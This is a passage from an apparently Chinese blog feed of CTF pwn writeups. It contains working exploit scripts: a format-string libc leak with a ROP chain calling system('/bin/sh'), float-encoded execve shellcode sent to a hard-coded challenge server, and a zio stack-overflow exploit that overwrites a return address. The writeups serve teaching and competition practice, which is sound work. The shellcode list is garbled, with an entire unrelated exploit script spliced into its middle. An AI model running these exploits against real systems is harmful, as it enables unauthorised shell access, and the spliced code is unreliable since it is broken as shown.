class="keyword">return</span> s.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">aoti_got = <span class="number">0x601fa8</span></span><br><span class="line">read_got = <span class="number">0x601fb8</span></span><br><span class="line"><span class="comment"># define interactive functions here</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># define exploit function here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    ru(<span class="string">&#x27;(max lenth:40):&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;%37$p&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;(max lenth:40):&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    libc_start = int(rn(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">240</span></span><br><span class="line">    info(<span class="string">&#x27;libc_start :&#x27;</span> + hex(libc_start))</span><br><span class="line">    </span><br><span class="line">    read_libc = u64(rn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    info(<span class="string">&#x27;read_libc :&#x27;</span> + hex(read_libc))</span><br><span class="line">    system = libc_start - <span class="number">0x7fabbb655a55</span> + <span class="number">0x7fabbb6754f0</span></span><br><span class="line"> <span class="comment">#   e = ELF(&#x27;.bc-64&#x27;)</span></span><br><span class="line">  <span class="comment">#  system = libc_start - e.symbols[&#x27;__libc_start_main&#x27;] + e.symbols[&#x27;system&#x27;]</span></span><br><span class="line">    info(<span class="string">&#x27;system :&#x27;</span> + hex(system))</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;(max lenth:20):&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;(max lenth:20):&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    buf = <span class="number">0x602000</span></span><br><span class="line">    pay = <span class="string">&#x27;0&#x27;</span> * <span class="number">40</span></span><br><span class="line">    pay += p64(<span class="number">0x400ed1</span>) <span class="comment"># pop rsi, r15, ret</span></span><br><span class="line">    pay += p64(buf)</span><br><span class="line">    pay += p64(<span class="number">0</span>)</span><br><span class="line">    pay += p64(<span class="number">0x400ed3</span>) <span class="comment"># pop rdi ret</span></span><br><span class="line">    pay += p64(<span class="number">0</span>)</span><br><span class="line">    pay += p64(<span class="number">0x400730</span>) <span class="comment"># read_got</span></span><br><span class="line">    pay += p64(<span class="number">0x400ed3</span>) <span class="comment"># pop rdi ret</span></span><br><span class="line">    pay += p64(buf)</span><br><span class="line">    pay += p64(system)</span><br><span class="line">    sn(pay.ljust(<span class="number">0x110</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>) </span><br><span class="line">    io.interactive()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pause()</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure><h1 id="loading"><a href="#loading" class="headerlink" title="loading"></a>loading</h1><p>这个题目是某PCTF的题  关键的是去构造float 的shellcode<br><a href="https://j31d0.github.io/writeup/2016/04/18/pctf2016-fixedpoint/">writeup</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode = [<span class="string">&quot;\x31\xc9&quot;</span>, <span class="comment"># xor ecx, ecx</span></span><br><span class="line">             <span class="string">&quot;\xf7\xe1&quot;</span>, <span class="comment"># mul ecx</span></span><br><span class="line">             <span class="string">&quot;\x51&quot;</span>, <span class="comment"># push ecx</span></span><br><span class="line">             <span class="string">&quot;\xb1\xff&quot;</span>, <span class="comment"># mov cl, 0xFF</span></span><br><span class="line">             <span class="string">&quot;\xb5\xff&quot;</span>, <span class="comment"># mov ch, 0xFF</span></span><br><span class="line">             <span class="string">&quot;\x41&quot;</span>, <span class="comment"># inc ecx</span></span><br><span class="line">             <span class="string">&quot;\xb4\x68&quot;</span>, <span class="comment"># mov ah, 0x68</span></span><br><span class="line">             <span class="string">&quot;\xb0\x73&quot;</span>, <span class="comment"># mov al, 0x73</span></span><br><span class="line">             <span class="string">&quot;\xf7\xe1&quot;</span>, <span class="comment"># mul ecx</span></span><br><span class="line">             <span class="string">&quot;\xb4\x2f&quot;</span>, <span class="comment"># mov ah, 0x2F</span></span><br><span class="line">             <span class="string">&quot;\xb0\x2f&quot;</span>, <span class="comment"># mov al, 0x2F</span></span><br><span class="line">             <span class="string">&quot;\x50&quot;</span>, <span class="comment"># push eax</span></span><br><span class="line">             <span class="string">&quot;\xb4\x6e&quot;</span>, <span class="comment"># mov ah, 0x6e</span></span><br><span class="line">             <span class="string">&quot;\xb0\x69&quot;</span>, <span class="comment"># mov al, 0x69</span></span><br><span class="line">             <span class="string">&quot;\xf7\xe1&quot;</span>, <span class="comment"># mul ecx</span></span><br><span class="line">             <span class="string">&quot;\xb4\x62&quot;</span>, <span class="comment"># mov ah, 0x62</span></span><br><span class="line">             <span class="string">&quot;\xb0\x2f&quot;</span>, <span class="comment"># mov al, 0x2F</span></span><br><span class="line">             <span class="string">&quot;\x50&quot;</span>, <span class="comment"># push eax</span></span><br><span class="line">             <span class="string">&quot;\x31\xc0&quot;</span>, <span class="comment"># xor eax, eax#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># switches</span></span><br><span class="line">DEBUG = <span class="number">0</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># modify this</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwnme&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(sys.argv[<span class="number">1</span>], int(sys.argv[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG: context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># define symbols and offsets here</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># simplified r/s function</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span>(<span class="params">delim</span>):</span></span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(delim)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rn</span>(<span class="params">count</span>):</span></span><br><span class="line">    <span class="keyword">return</span> io.recvn(count)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ra</span>(<span class="params">count</span>):</span>      <span class="comment"># recv all</span></span><br><span class="line">    buf = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> count:</span><br><span class="line">        tmp = io.recvn(count)</span><br><span class="line">        buf += tmp</span><br><span class="line">        count -= len(tmp)</span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> io.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sn</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>(<span class="params">string</span>):</span></span><br><span class="line">    <span class="keyword">return</span> log.info(string)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dehex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">aoti_got = <span class="number">0x601fa8</span></span><br><span class="line">read_got = <span class="number">0x601fb8</span></span><br><span class="line"><span class="comment"># define interactive functions here</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># define exploit function here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    ru(<span class="string">&#x27;(max lenth:40):&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;%37$p&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;(max lenth:40):&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    libc_start = int(rn(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">240</span></span><br><span class="line">    info(<span class="string">&#x27;libc_start :&#x27;</span> + hex(libc_start))</span><br><span class="line">    </span><br><span class="line">    read_libc = u64(rn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    info(<span class="string">&#x27;read_libc :&#x27;</span> + hex(read_libc))</span><br><span class="line">    system = libc_start - <span class="number">0x7fabbb655a55</span> + <span class="number">0x7fabbb6754f0</span></span><br><span class="line"> <span class="comment">#   e = ELF(&#x27;.bc-64&#x27;)</span></span><br><span class="line">  <span class="comment">#  system = libc_start - e.symbols[&#x27;__libc_start_main&#x27;] + e.symbols[&#x27;system&#x27;]</span></span><br><span class="line">    info(<span class="string">&#x27;system :&#x27;</span> + hex(system))</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;(max lenth:20):&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;(max lenth:20):&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    buf = <span class="number">0x602000</span></span><br><span class="line">    pay = <span class="string">&#x27;0&#x27;</span> * <span class="number">40</span></span><br><span class="line">    pay += p64(<span class="number">0x400ed1</span>) <span class="comment"># pop rsi, r15, ret</span></span><br><span class="line">    pay += p64(buf)</span><br><span class="line">    pay += p64(<span class="number">0</span>)</span><br><span class="line">    pay += p64(<span class="number">0x400ed3</span>) <span class="comment"># pop rdi ret</span></span><br><span class="line">    pay += p64(<span class="number">0</span>)</span><br><span class="line">    pay += p64(<span class="number">0x400730</span>) <span class="comment"># read_got</span></span><br><span class="line">    pay += p64(<span class="number">0x400ed3</span>) <span class="comment"># pop rdi ret</span></span><br><span class="line">    pay += p64(buf)</span><br><span class="line">    pay += p64(system)</span><br><span class="line">    sn(pay.ljust(<span class="number">0x110</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>) </span><br><span class="line">    io.interactive()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pause()</span><br><span class="line">    pwn()</span><br><span class="line">             <span class="string">&quot;\x31\xd2&quot;</span>, <span class="comment"># xor edx, edx</span></span><br><span class="line">             <span class="string">&quot;\x31\xc9&quot;</span>, <span class="comment"># xor ecx, ecx</span></span><br><span class="line">             <span class="string">&quot;\x89\xe3&quot;</span>, <span class="comment"># mov ebx, esp</span></span><br><span class="line">             <span class="string">&quot;\xb0\x0b&quot;</span>, <span class="comment"># mov al, 11</span></span><br><span class="line">             <span class="string">&quot;\xcd\x80&quot;</span>] <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">ints_to_send = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> instr <span class="keyword">in</span> shellcode:</span><br><span class="line">    z = <span class="string">&quot;\x40&quot;</span></span><br><span class="line">    <span class="keyword">if</span> len(instr) == <span class="number">1</span>:</span><br><span class="line">        z = <span class="string">&quot;\x90\x40&quot;</span></span><br><span class="line">    payload = <span class="string">&quot;\x48&quot;</span> + instr[::<span class="number">-1</span>] + z</span><br><span class="line">    a = struct.unpack(<span class="string">&quot;&gt;f&quot;</span>, payload)[<span class="number">0</span>]*<span class="number">2333</span></span><br><span class="line">    <span class="keyword">if</span> a &gt; <span class="number">2147483647</span>:</span><br><span class="line">        log.error(<span class="string">&quot;It&#x27;s too large fam.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    b = str(<span class="string">&quot;&#123;0:f&#125;&quot;</span>.format(a)).split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    log.info(b + <span class="string">&quot; &quot;</span> + payload.encode(<span class="string">&quot;hex&quot;</span>))</span><br><span class="line">    ints_to_send.append(b)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;106.75.84.68&quot;</span>, <span class="number">20000</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ints_to_send:</span><br><span class="line">    r.sendline(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="3-7z"><a href="#3-7z" class="headerlink" title="3.7z"></a>3.7z</h1><p>这个题目就厉害了，居然有有一个backdoor，应该是题目设计者的问题吧，这个题目思路很简单，就是只要满足图下的check就可以拿到一个后门权限了</p><p>后门的逻辑是这样的，只要输入的满足</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(<span class="string">&#x27;useragent&#x27;</span>)):</span><br><span class="line">  buf += chr(i^ord(<span class="string">&#x27;useragent&#x27;</span>[i])</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> i春秋-百度杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一次基于zio编写pwn的exp的尝试</title>
      <link href="Based-on-zio-exp-first-attempt.html"/>
      <url>Based-on-zio-exp-first-attempt.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="ZIO"><a href="#ZIO" class="headerlink" title="ZIO"></a>ZIO</h1><h2 id="ZIO简介"><a href="#ZIO简介" class="headerlink" title="ZIO简介"></a>ZIO简介</h2><p>zio是一个专门为CTF PWN开发的Python库，基于zio可以方便实现对远程服务器上的服务程序进行数据读写操作。不仅如此，zio甚至还支持对本地程序的数据读写操作。<br>zio是一个开源项目，其在GitHub上的官方项目地址为 <a href="https://github.com/zTrix/zio">https://github.com/zTrix/zio</a>。zio默认只支持Linux和Mac OSX系统，如果需要在Windows下使用可能需要额外安装一些Python扩展包，或者需要自己对zio的代码进行相关的修改</p><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><h3 id="与远程服务器建立连接"><a href="#与远程服务器建立连接" class="headerlink" title="与远程服务器建立连接"></a>与远程服务器建立连接</h3><p>zio(target)，其中target是一个元组，即(IP, PORT)，其中IP是字符串形式的IP地址，PORT是数字形式的端口号</p><h3 id="从远程服务器读取数据"><a href="#从远程服务器读取数据" class="headerlink" title="从远程服务器读取数据"></a>从远程服务器读取数据</h3><ol><li><p>read，直接从远程服务器读取数据；</p></li><li><p>readline，从远程服务器读取一行数据；</p></li><li><p>read_until(pattern)，从远程服务器读取数据，直到遇到pattern字符串</p><h3 id="向远程数据发送数据"><a href="#向远程数据发送数据" class="headerlink" title="向远程数据发送数据"></a>向远程数据发送数据</h3></li><li><p>write </p></li><li><p>writeline 向远程服务器写数据（在数据末尾自动添加换行符）</p><h3 id="与服务器建立shell交互"><a href="#与服务器建立shell交互" class="headerlink" title="与服务器建立shell交互"></a>与服务器建立shell交互</h3><p>interact，在成功获取服务器控制权限之后，我们需要建立一个shell来对远程服务器进行管理，使用zio的interact函数即可完成这一功能。</p><p>可以看到，基于zio编写代码省去了自己建立socat连接这一过程，而且使用zio封装的read/write接口替代socket的recv/send接口，使得代码更加具有可读性。</p></li></ol><h1 id="玩pwn是少不了服务的搭建的"><a href="#玩pwn是少不了服务的搭建的" class="headerlink" title="玩pwn是少不了服务的搭建的"></a>玩pwn是少不了服务的搭建的</h1><p>虽然zio有自己建立socat的过程 但是却没有让程序在应该被监听的环境下</p><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>apt-get insatll socat</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:10002,fork EXEC:.&#x2F;pwn</span><br></pre></td></tr></table></figure><h3 id="第二次复用"><a href="#第二次复用" class="headerlink" title="第二次复用"></a>第二次复用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:10002,reuseaddr,fork EXEC:~.&#x2F;CTF&#x2F;pwn</span><br></pre></td></tr></table></figure><p>##　通用代码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">curdir = os.path.abspath(os.getcwd())</span><br><span class="line">num = curdir.split(<span class="string">&quot;/&quot;</span>)[<span class="number">-1</span>]</span><br><span class="line">file = <span class="string">&quot;pwn&quot;</span> + num</span><br><span class="line">cmd +[<span class="string">&quot;socat&quot;</span>,<span class="string">&quot;TCP-LISTEN:2333 %s,reuseaddr,fork&quot;</span> % num, <span class="string">&quot;EXEC:./%s&quot;</span> %file]</span><br><span class="line">server.wait()</span><br></pre></td></tr></table></figure><h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><p>虽然开始玩pwn了 然而linux下的程序用<code>gdb</code>分析还是不怎么习惯 所以即使是这一次的博文，笔者也没有用多少的调试技巧 只是用 <code>IDA</code>看了看程序而已 依旧只是为未入门水平。 感叹阿<br>对程序的main函数试用IDA的F5功能 即将汇编转化成伪代码</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-01.jpg"></a></p><p>这里有两个函数 一个是 <code>be_nice_to_people</code> 这个仅仅只是通过getegid获取进程的有效组ID（effective group ID），随后将有效组ID当作参数传递给setresgid函数。setresgid用于设置真实的、有效的和保存过的组标识号。综上所述，be_nice_to_people的作用就是设置pwn1进程自身的一些权限信息，这里不做过多介绍。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-02.jpg"></a></p><p>并没有可利用点</p><p>还有一个函数是<code>vulnerable_function</code></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-03.jpg"></a></p><p>栈上定义了一个缓冲区，并通过<code>read</code>函数来读取数据存放到这个缓冲区里面（最多读取0x100个字节）<br>如果这里的<code>buf</code>比0x10小的话，那么这里就会有一个溢出 问题buf有多大呢？咱们继续分析 回到原来的汇编语言状态<br>  在IDA的“IDA View-A”选项卡中，可以看到vulnerable_function对应的反汇编指令列表如下图所示：</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-04.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-04.jpg"></a></p><p>可以看出来这里缓冲区的起始地址为ebp-0x88，而read指定的字节数为0x100，那么显然这里就是一个溢出点<br>画个列表分析一下</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-05.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-05.jpg"></a></p><p> 可以看出要覆盖到返回地址需要0x88 + 4 = 140字节的数据，即第141~144字节的数据可以用于覆盖函数的返回地址。</p><p>在这之前我知道了pwn程序开启了NX（无法把栈上的数据当作代码来执行）（用checksec.sh可以检测出来）<br>所以我开始尝试看pwn程序中是否有调用system(“/bin/bash”)的代码，如果有的话直接控制EIP跳转过去执行即可。<br>现在继续使用IDA进行分析。在IDA中切换到Imports选项卡查看程序的导入函数列表，发现其中存在有对system函数的调用，如下图所示：</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-06.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-06.jpg"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-07.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-07.jpg"></a></p><p>这里的not_called就是我们要找的函数，对应的地址为0x080484A4，我们控制EIP跳转到0x080484A4执行代码即可</p><h1 id="exp的编写"><a href="#exp的编写" class="headerlink" title="exp的编写"></a>exp的编写</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp_pwn</span>()：</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 调用<span class="title">zio</span>构造函数与服务器链接</span></span><br><span class="line">io = zio((&#x27;127.0.0.1&#x27;,2333))</span><br><span class="line"><span class="comment">#l32为zio提供的用于将32位整数（小端模式）转化为字符串的函数</span></span><br><span class="line"></span><br><span class="line">ret_addr = l32(<span class="number">0x080484A4</span>)</span><br><span class="line"><span class="comment"># 构造payload</span></span><br><span class="line">payload =<span class="string">&#x27;A&#x27;</span>*<span class="number">140</span>+ret_addr</span><br><span class="line"><span class="comment"># 发送数据</span></span><br><span class="line">io.writeline(payload)</span><br><span class="line"><span class="comment"># 获取服务器控制权限后形成的shell</span></span><br><span class="line">io.interact()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> exp_pwn()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Other </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> zio </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sycsec-极客大挑战-Writeup</title>
      <link href="2016-sycgeek-Writeup.html"/>
      <url>2016-sycgeek-Writeup.html</url>
      
